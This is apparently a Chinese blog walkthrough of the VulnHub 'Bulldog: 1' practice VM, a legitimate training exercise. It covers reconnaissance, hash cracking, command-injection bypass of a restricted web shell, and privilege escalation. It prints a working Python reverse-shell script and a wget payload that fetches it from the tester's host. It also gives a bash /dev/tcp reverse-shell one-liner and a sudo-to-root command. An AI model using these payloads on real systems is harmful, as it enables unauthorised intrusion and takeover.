# 原创
：  VulnHub渗透测试实战靶场 - Bulldog: 1

# VulnHub渗透测试实战靶场 - Bulldog: 1

#### VulnHub渗透测试实战靶场 - Bulldog: 1

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/bulldog/bulldog.ova)


## Bulldog: 1靶机搭建

> 
具体步骤参考[VirtualBox(Host only)和VMware共用同一虚拟网卡](https://blog.csdn.net/LYJ20010728/article/details/119395324?spm=1001.2014.3001.5501)



> 
获取到IP地址为：`192.168.56.101`


## 渗透测试

### 信息搜集

> 
用Kali自带的Nmap扫描目标IP：`sudo nmap -sS -A 192.168.56.101`，发现开放了`23、80、8080`端口


> 
用`dirsearch`对web目录进行扫描：`python3 dirsearch.py -u 192.168.56.101 -e *.php`


### 漏洞挖掘

> 
访问80端口


> 
用`whatweb`进行web站扫描：`whatweb http://192.168.56.101/`，发现是Django建站


```
http://192.168.56.101/ [200 OK] Bootstrap, Country[RESERVED][ZZ], maybe Django, HTML5, HTTPServer[WSGIServer/0.1 Python/2.7.12], IP[192.168.56.101], JQuery, Python[2.7.12], Script, Title[Bulldog Industries], X-Frame-Options[SAMEORIGIN]

```

> 
依次访问扫描到的web目录


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c22a40e8af5f4f98913eada571811a92.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cc8778e277b741b292ee14c6a66e785f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9e7a3d9c5eef43a9a47be6a17135dc8f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
测试后发现，`robots.txt`页面没有什么有用的信息，`/admin`无法注入成功，在`/dev`发现一些可疑的hash值，解密后发现


```
6515229daf8dbdc8b89fed2e60f107433da5f2cb
破解失败
38882f3b81f8f2bc47d9f3119155b05f954892fb
破解失败
c6f7e34d5d08ba4a40dd5627508ccb55b425e279
破解失败
0e6ae9fe8af1cd4192865ac97ebf6bda414218a9
破解失败
553d917a396414ab99785694afd51df3a8a8a3e0
破解失败
ddf45997a7e18a25ad5f5cf222da64814dd060d5
bulldog
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e
bulldoglover

```

> 
尝试用得到的两组数据进行登录，发现可以用`sarah:bulldoglover`进行登录，登陆进去后使用web-shell


> 
给了6个可用的命令，执行其他的命令会被拦截，这里用`&amp;`或者`|`进行命令组合绕过，也可以用`echo`来绕过


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e4ace806b1fd4bccb4a29d0ab7ae5345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/657cda5bd3d74ea0831dd63ab3fe9793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

### getshell

> 
发现可以成功绕过限制后，在Kali上用python起一个HTTP服务器：`python2 -m SimpleHTTPServer 80`，将把shell文件放到网站目录下，通过靶机下载用python写的shell反弹脚本


```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.102",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])

```

> 
Payload：`pwd&amp;&amp;wget http://192.168.56.102/shell.py`，成功下载到shell文件


> 
起一个监听：`nc -nvvlp 1234`，执行Payload：`pwd&amp;&amp;python shell.py`，成功反弹shell


> 
补充一下用`echo`绕过的话反弹shell的姿势：`echo ‘bash -i &gt;&amp; /dev/tcp/192.168.56.102/12340&gt;&amp;1’|bash`


### 提权

> 
首先用`whoami`、`uname -a`、`cat /etc/issue`查看一下有没有可以利用的信息


> 
翻阅目录查找信息，在`/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp`中找到sudo的密码：`SUPERultimatePASSWORDyouCANTget`


> 
提升权限至root：`sudo python -c 'import pty;pty.spawn("/bin/bash")'`

